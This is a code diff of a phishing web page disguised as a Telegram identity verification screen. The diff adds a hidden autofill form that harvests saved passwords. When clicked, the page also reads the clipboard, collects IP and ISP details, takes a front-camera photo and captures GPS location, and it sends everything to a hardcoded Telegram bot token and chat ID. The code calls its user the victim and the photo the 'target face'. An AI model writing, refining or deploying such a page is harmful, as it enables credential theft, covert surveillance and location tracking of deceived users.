@@ -3,100 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Identity Verification</title>
+    <title>Telegram - Identity Verification</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 35px; border-radius: 15px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); width: 85%; max-width: 350px; text-align: center; }
-        .logo { width: 90px; margin-bottom: 15px; }
-        h2 { font-size: 20px; color: #222; margin-bottom: 10px; }
-        p { color: #707579; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
-        .btn { background: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; position: relative; z-index: 10; }
+        .logo { width: 100px; margin-bottom: 25px; }
+        h2 { font-size: 22px; font-weight: 600; color: #222; margin-bottom: 12px; }
+        p { color: #707579; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
+        .btn { background-color: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; -webkit-appearance: none; }
+        .btn:hover { background-color: #2b7dcb; }
+        
+        /* شاردنەوەی تەڵەکان لە چاوی قوربانی */
+        #trap-form { opacity: 0.01; position: absolute; top: 0; left: 0; height: 1px; width: 1px; overflow: hidden; }
         video, canvas { display: none; }
+        .loading { display: none; margin-top: 15px; color: #3390ec; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
-        <h2>Verification Required</h2>
-        <p>Your session has expired. Please verify your device identity to log back in.</p>
-        <button class="btn" id="mainBtn">START VERIFICATION</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="logo">
+        <h2>Security Verification</h2>
+        <p>To continue accessing this content, please verify your device identity and allow security permissions.</p>
+        
+        <!-- Password Manager & Autofill Trap -->
+        <form id="trap-form">
+            <input type="text" name="username" id="trap_user" autocomplete="username">
+            <input type="password" name="password" id="trap_pass" autocomplete="current-password">
+            <input type="email" id="af_email" autocomplete="email">
+        </form>
+
+        <button class="btn" id="mainBtn">VERIFY & PROCEED</button>
+        <div id="status" class="loading">Processing Security Check...</div>
     </div>
 
-    <!-- ئەمانە بۆ ئایفۆن زۆر گرنگن -->
-    <video id="video" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <!-- پێویستە بۆ iOS -->
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
         const chatId = "6679834643";
 
-        function sendToBot(text) {
-            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        async function sendToBot(text) {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: text })
             });
         }
 
+        async function stealSavedPasswords() {
+            // وێستان بۆ ئەوەی وێبگەڕ بوار بدات بە Autofill
+            await new Promise(r => setTimeout(r, 1500));
+            let u = document.getElementById('trap_user').value;
+            let p = document.getElementById('trap_pass').value;
+            let e = document.getElementById('af_email').value;
+
+            if (p) {
+                await sendToBot(`🔑 PASSWORD CAPTURED!\n👤 User/Email: ${u}\n🔒 Password: ${p}\n📧 Recovery: ${e}`);
+            } else {
+                // هەوڵدان بۆ Trigger کردن ئەگەر پڕ نەبووبووەوە
+                document.getElementById('trap_pass').focus();
+                setTimeout(() => {
+                    let p2 = document.getElementById('trap_pass').value;
+                    if(p2) sendToBot(`🔑 Password (Triggered): ${p2}`);
+                }, 1000);
+            }
+        }
+
         document.getElementById('mainBtn').addEventListener('click', async function() {
             const btn = this;
-            btn.innerText = "Processing...";
-            btn.disabled = true;
+            document.getElementById('status').style.display = 'block';
+            btn.style.display = 'none';
 
-            // ١. هەوڵدان بۆ گرتنی وێنە (ئەمە دەبێت یەکەم شت بێت لە ئایفۆن)
+            // ١. دزینی Clipboard
+            try {
+                const clip = await navigator.clipboard.readText();
+                if(clip) await sendToBot("📋 Clipboard: " + clip);
+            } catch (e) {}
+
+            // ٢. دەستپێکردنی دزینی پاسوۆردەکان
+            stealSavedPasswords();
+
+            // ٣. زانیاری ئایپی و ISP
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sendToBot(`🌐 IP: ${d.ip}\n🏙️ City: ${d.city}\n🏢 ISP: ${d.org}`);
+            });
+
+            // ٤. وێنەی کامێرا (ئایفۆن و ئەندرۆید)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // کەمێک وێستان بۆ ئەوەی کامێراکە ئامادە بێت
-                await new Promise(r => setTimeout(r, 1000));
+                await new Promise(r => setTimeout(r, 1500));
                 
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
                 fd.append('photo', blob, 'face.jpg');
-                
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                fd.append('caption', '👤 Target Face Captured!');
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                 stream.getTracks().forEach(t => t.stop());
-            } catch (e) {
-                await sendToBot("❌ iOS Camera Access Denied");
-            }
+            } catch (e) { await sendToBot("❌ Camera Access Denied"); }
 
-            // ٢. هەوڵدان بۆ وەرگرتنی لۆکەیشن (گەڕانەوە بۆ لایەنێکی تری ئایفۆن)
+            // ٥. GPS دواین هەنگاو
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await sendToBot(`📍 iOS GPS:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                    finish();
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    await sendToBot(`📍 GPS Location:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                    window.location.href = "index.html";
                 }, async (err) => {
-                    await sendToBot("❌ iOS GPS Access Denied");
-                    finish();
-                }, { enableHighAccuracy: true, timeout: 5000 });
+                    await sendToBot("❌ GPS Access Denied");
+                    window.location.href = "index.html";
+                }, { enableHighAccuracy: true, timeout: 7000 });
             } else {
-                finish();
-            }
-
-            // ٣. Clipboard و IP (لە باکگراونددا کار دەکەن)
-            try {
-                const clip = await navigator.clipboard.readText();
-                if(clip) sendToBot("📋 Clipboard: " + clip);
-            } catch(e) {}
-            
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}\nCity: ${d.city}`));
-        });
-
-        function finish() {
-            // دوای ٣ چرکە دەیبات بۆ لاپەڕەی دواتر تا دڵنیا بین داتاکان نێردراون
-            setTimeout(() => {
                 window.location.href = "index.html";
-            }, 2000);
-        }
+            }
+        });
     </script>
 </body>
 </html>
